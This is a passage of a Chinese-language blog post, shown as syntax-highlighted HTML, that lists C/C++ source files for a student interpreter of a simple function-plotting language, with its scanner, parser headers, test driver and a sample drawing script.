class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> DIV<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token char">'*'</span><span class="token operator">:</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'*'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> POWER<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> MUL<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">default</span><span class="token operator">:</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> ERRTOKEN<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="test-parser-cpp"><a href="#test-parser-cpp" class="headerlink" title="test_parser.cpp"></a>test_parser.cpp</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"parser.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable<span class="token operator">:</span><span class="token number">4996</span><span class="token punctuation">)</span></span></span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">Parser</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>SrcFilePtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span>  <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span>p<span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">20</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"test_parser.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Parser</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="3、语义分析器及绘图"><a href="#3、语义分析器及绘图" class="headerlink" title="3、语义分析器及绘图"></a>3、语义分析器及绘图</h3><p><strong>测试文本：</strong><br><strong>test2.txt</strong></p><pre class="language-txt" data-language="txt"><code class="language-txt">--------------- 图形1：origin is (20, 200);-- 设置原点的偏移量rot is 0;-- 不旋转scale is (40, 40);-- 设置比例for T from 0 to 2*pi step pi/50 draw (t, -sin(t));-- 画T的轨迹origin is (20, 240);-- 下移40单位for T from 0 to 2*pi step pi/50 draw (t, -sin(t));-- 画T的轨迹origin is (20, 280);-- 再下移40单位for T from 0 to 2*pi step pi/50 draw (t, -sin(t));-- 画T的轨迹--------------- 图形2：origin is (380, 240);-- 右移scale is (80, 80/3);-- y方向压缩为三分之一rot is pi/2+0*pi/3 ;-- 旋转初值设置for T from -pi to pi step pi/50 draw (cos(t), sin(t));-- 画T的轨迹rot is pi/2+2*pi/3;-- 旋转2/3*pifor T from -pi to pi step pi/50 draw (cos(t), sin(t));-- 画T的轨迹rot is pi/2-2*pi/3;-- 再旋转2/3*pifor T from -pi to pi step pi/50 draw (cos(t), sin(t));-- 画T的轨迹--------------- 图形3：origin is(580, 240);-- 再右移scale is (80, 80);-- 恢复原比例rot is 0;-- 不旋转for t from 0 to 2*pi step pi/50 draw(cos(t),sin(t));-- 画T的轨迹for t from 0 to Pi*20 step Pi/50 draw-- 画T的轨迹   ((1-1/(10/7))*Cos(T)+1/(10/7)*Cos(-T*((10/7)-1)), (1-1/(10/7))*Sin(T)+1/(10/7)*Sin(-T*((10/7)-1)));</code></pre><h4 id="Semantic-h"><a href="#Semantic-h" class="headerlink" title="Semantic.h"></a>Semantic.h</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;wingdi.h></span></span><span class="token comment">//“VC_Compiler”是用windows自带图形库实现的词法分析器，程序结果输出函数绘图语言解释器绘出的图像</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"parser.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">red</span> <span class="token expression"><span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></span><span class="token comment">//红色</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">black</span> <span class="token expression"><span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></span><span class="token comment">//黑色</span></span><span class="token comment">//外部函数声明</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">DrawPixel</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绘制一个点</span><span class="token keyword">extern</span> <span class="token keyword">double</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span> root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得表达式的值</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">DrawLoop</span><span class="token punctuation">(</span><span class="token keyword">double</span> Start<span class="token punctuation">,</span><span class="token keyword">double</span> End<span class="token punctuation">,</span><span class="token keyword">double</span> Step<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>HorPtr<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>VerPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//图形绘制</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">DelExprTree</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除一棵树#pragma once</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span></code></pre><h4 id="Scanner-h-1"><a href="#Scanner-h-1" class="headerlink" title="Scanner.h"></a>Scanner.h</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">SCANNER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SCANNER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span> <span class="token comment">//ctype.h是C标准函数库中的头文件，定义了一批C语言字符分类函数，用于测试字符是否属于特定的字符类别，</span></span><span class="token comment">//如字母字符、控制字符等等。</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdarg.h></span><span class="token comment">//让函数可以接收可变参数</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span><span class="token comment">//记号类别枚举</span><span class="token punctuation">&#123;</span>ORIGIN<span class="token comment">/* 0 */</span><span class="token punctuation">,</span> SCALE<span class="token comment">/* 1 */</span><span class="token punctuation">,</span> ROT<span class="token comment">/* 2 */</span><span class="token punctuation">,</span> IS<span class="token comment">/* 3 */</span><span class="token punctuation">,</span> TO<span class="token comment">/* 4 */</span><span class="token punctuation">,</span> STEP<span class="token comment">/* 5 */</span><span class="token punctuation">,</span> DRAW<span class="token comment">/* 6 */</span><span class="token punctuation">,</span> FOR<span class="token comment">/* 7 */</span><span class="token punctuation">,</span> FROM<span class="token comment">/* 8 */</span><span class="token punctuation">,</span><span class="token comment">//保留字</span>T<span class="token comment">/* 9 */</span><span class="token punctuation">,</span><span class="token comment">//参数</span>SEMICO<span class="token comment">/* 10 */</span><span class="token punctuation">,</span> L_BRACKET<span class="token comment">/* 11 */</span><span class="token punctuation">,</span> R_BRACKET<span class="token comment">/* 12 */</span><span class="token punctuation">,</span> COMMA<span class="token comment">/* 13 */</span><span class="token punctuation">,</span><span class="token comment">//分层符号</span>PLUS<span class="token comment">/* 14 */</span><span class="token punctuation">,</span> MINUS<span class="token comment">/* 15 */</span><span class="token punctuation">,</span> MUL<span class="token comment">/* 16 */</span><span class="token punctuation">,</span> DIV<span class="token comment">/* 17 */</span><span class="token punctuation">,</span> POWER<span class="token comment">/* 18 */</span><span class="token punctuation">,</span><span class="token comment">//运算符</span>FUNC<span class="token comment">/*19 */</span><span class="token punctuation">,</span><span class="token comment">//函数</span>CONST_ID<span class="token comment">/* 20 */</span><span class="token punctuation">,</span><span class="token comment">//常数</span>NONTOKEN<span class="token comment">/* 21 */</span><span class="token punctuation">,</span><span class="token comment">//空记号，标记源程序文件的结束</span>ERRTOKEN<span class="token comment">/* 22 */</span><span class="token comment">//出错记号，标记非法输入</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">double</span><span class="token punctuation">(</span><span class="token operator">*</span>MathFuncPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//MathFuncPtr代表一个指向返回double值并带有一个double形参的函数的指针的类型</span><span class="token keyword">struct</span> <span class="token class-name">Token</span><span class="token punctuation">&#123;</span>Token_Type type<span class="token punctuation">;</span><span class="token comment">//记号类别</span><span class="token keyword">char</span> <span class="token operator">*</span> lexeme<span class="token punctuation">;</span><span class="token comment">//属性，字符串，指向char类型的指针</span><span class="token keyword">double</span> value<span class="token punctuation">;</span><span class="token comment">//属性，常数的值，double型</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token operator">*</span>FuncPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//属性，函数指针，代表一个指向返回double值并带有一个double形参的函数的指针的类型</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> Token TokenTab<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token comment">//符号表内容</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> CONST_ID<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"PI"</span><span class="token punctuation">,</span> <span class="token number">3.1415926</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> CONST_ID<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"E"</span><span class="token punctuation">,</span><span class="token number">2.71828</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> T<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"T"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"SIN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>sin <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"COS"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>cos <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"TAN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>tan <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"LN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>log <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"EXP"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>exp <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"SQRT"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>sqrt <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> ORIGIN<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"ORIGIN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> SCALE<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"SCALE"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> ROT<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"ROT"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> IS<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"IS"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FOR<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"FOR"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FROM<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"FROM"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> TO<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"TO"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> STEP<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"STEP"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> DRAW<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"DRAW"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">;</span><span class="token comment">//跟踪记号所在源文件行号</span><span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">InitScanner</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化词法分析器</span><span class="token keyword">extern</span> Token <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取记号函数</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭词法分析器</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span></code></pre><h4 id="Parser-h-1"><a href="#Parser-h-1" class="headerlink" title="Parser.h"></a>Parser.h</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">PARSER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PARSER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"scanner.h"</span></span><span class="token keyword">typedef</span> <span class="token keyword">double</span><span class="token punctuation">(</span><span class="token operator">*</span>FuncPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span>                                             <span class="token comment">//语法树节点类型</span><span class="token punctuation">&#123;</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> OpCode<span class="token punctuation">;</span>                                 <span class="token comment">//PLUS,MINUS,MUL,DIV,POWER,FUNC,CONST_ID，T</span><span class="token keyword">union</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> ExprNode <span class="token operator">*</span>Left<span class="token punctuation">,</span> <span class="token operator">*</span>Right<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>CaseOperater<span class="token punctuation">;</span>     <span class="token comment">//二元运算：只有左右孩子的内部节点</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> ExprNode <span class="token operator">*</span>Child<span class="token punctuation">;</span> FuncPtr MathFuncPtr<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>CaseFunc<span class="token punctuation">;</span><span class="token comment">//函数调用：只有一个孩子的内部节点，还有一个指向对应函数名的指针 MathFuncPtr</span><span class="token keyword">double</span> CaseConst<span class="token punctuation">;</span>                                   <span class="token comment">//常数：叶子节点  右值</span><span class="token keyword">double</span> <span class="token operator">*</span>CaseParmPtr<span class="token punctuation">;</span>                                <span class="token comment">//参数T   左值：存放T的值得地址</span><span class="token punctuation">&#125;</span>Content<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">Parser</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>SrcFilePtr<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">//语法分析器对外接口</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span></code></pre><h4 id="Scanner-cpp-1"><a href="#Scanner-cpp-1" class="headerlink" title="Scanner.cpp"></a>Scanner.cpp</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"scanner.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TOKEN_LEN</span> <span class="token expression"><span class="token number">100</span></span><span class="token comment">//记号最大长度</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable<span class="token operator">:</span> <span class="token number">4996</span><span class="token punctuation">)</span></span></span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">;</span><span class="token comment">//源文件行号</span><span class="token keyword">static</span> FILE <span class="token operator">*</span>InFile<span class="token punctuation">;</span><span class="token comment">//输入文件流</span><span class="token keyword">static</span> <span class="token keyword">char</span> TokenBuffer<span class="token punctuation">[</span>TOKEN_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//记号字符缓冲</span><span class="token comment">//初始化词法分析器</span><span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">InitScanner</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>FileName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>LineNo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//行号</span>InFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//只读形式打开文件</span><span class="token keyword">if</span> <span class="token punctuation">(</span>InFile <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//打开成功</span><span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//打开失败</span><span class="token punctuation">&#125;</span><span class="token comment">//关闭词法分析器</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>InFile <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token function">fclose</span><span class="token punctuation">(</span>InFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭文件</span><span class="token punctuation">&#125;</span><span class="token comment">//从输入源程序（流）读字符</span><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> Char <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span>InFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//逐个字符读</span><span class="token keyword">return</span> <span class="token function">toupper</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//全部转换为大写，然后return</span><span class="token punctuation">&#125;</span><span class="token comment">//将预读字符退回源程序（流）</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">BackChar</span><span class="token punctuation">(</span><span class="token keyword">char</span> Char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token function">ungetc</span><span class="token punctuation">(</span>Char<span class="token punctuation">,</span> InFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//加入字符到记号缓冲区</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">AddCharTokenString</span><span class="token punctuation">(</span><span class="token keyword">char</span> Char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> TokenLength <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>TokenLength <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//数组越界</span>TokenBuffer<span class="token punctuation">[</span>TokenLength<span class="token punctuation">]</span> <span class="token operator">=</span> Char<span class="token punctuation">;</span><span class="token comment">//写入字符到缓冲区</span>TokenBuffer<span class="token punctuation">[</span>TokenLength <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token comment">//加入字符串结束标志“\0”</span><span class="token punctuation">&#125;</span><span class="token comment">//请空记号缓冲区</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">EmptyTokenString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">memset</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> TOKEN_LEN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//判断记号是否在记号表中</span><span class="token keyword">static</span> Token <span class="token function">JudgeKeyToken</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>IDString<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> loop<span class="token punctuation">;</span><span class="token comment">//sizeof(TokenTab)L:表示这个数组一共占了多少字节数;sizeof(TokenTab[0])：表示一个元素所占的字节数,两者相除，表述数组中一共有多少个元素</span><span class="token keyword">for</span> <span class="token punctuation">(</span>loop <span class="token 